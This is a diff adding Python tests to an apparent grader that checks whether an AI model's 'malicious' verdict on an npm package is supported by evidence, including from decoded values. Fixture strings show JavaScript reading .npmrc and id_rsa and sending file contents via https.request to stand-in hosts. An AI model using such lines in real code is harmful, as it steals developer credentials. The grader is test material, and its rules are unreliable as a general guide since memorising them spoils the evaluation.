@@ -13,6 +13,7 @@ class _WS:
         self.facts = list(facts)
         self._too_large = list(too_large)
         self.inv = Config().investigator
+        self.decoded_from = {}
     def required_files(self): return ["setup.js", "index.js"]
     def too_large(self): return self._too_large
 
@@ -137,3 +138,22 @@ def test_a_comment_the_model_added_is_ignored():
 def test_code_that_is_not_in_the_file_is_still_rejected():
     assert not _match("function keys() {\n  ...\n  return fs.readFileSync(d + '/id_rsa');")
     assert not _match("... https.request({ hostname: 'other.example.invalid' ...")
+
+
+def _decoded_ws(origin):
+    ws = _WS(FILES, ALL)
+    ws.read_text[("decoded", "d1")] = "https.request({ host: 'c.example.invalid' }).end(require('fs').readFileSync(k))"
+    ws.decoded_from = {"d1": origin}
+    return ws
+
+
+def test_a_chain_end_may_be_quoted_from_a_decode_of_the_package_s_own_value():
+    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("d1", "https.request({ host: 'c.example.invalid' })")), _decoded_ws("setup.js"))
+    assert (o.verdict, o.outcome) == ("malicious", "confirmed")
+
+
+def test_a_decode_of_a_value_the_model_supplied_is_not_evidence():
+    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
+                        chain_sink=_q("d1", "https.request({ host: 'c.example.invalid' })")), _decoded_ws(None))
+    assert o.outcome == "inconclusive"
